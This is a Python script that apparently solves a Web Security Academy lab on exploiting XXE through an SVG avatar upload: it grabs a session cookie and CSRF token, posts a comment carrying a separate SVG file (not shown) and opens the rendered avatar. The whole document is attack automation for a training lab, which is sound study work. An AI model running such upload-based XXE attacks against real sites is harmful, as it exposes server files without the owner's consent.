import requests
import argparse
import re
import webbrowser as wb

parser = argparse.ArgumentParser(description='Solves the following Lab: Exploiting XXE via image file upload')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + ".web-security-academy.net/post/?postId=1")
cookie = {'Cookie':f"session={r.cookies.get('session')}"}
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
avatar = open('07_Avatar.svg', 'rb')
files = {'avatar':avatar}
data={'csrf':csrf,'postId':'1','comment':'XXE','name':'XXE via image file upload','email':'xxe@xxe.com'}



r = requests.post("https://" + lab.id + ".web-security-academy.net/post/comment", headers=cookie, data=data, files=files, allow_redirects=False)
wb.open("https://" + lab.id + ".web-security-academy.net/post/comment/avatars?filename=1.png")
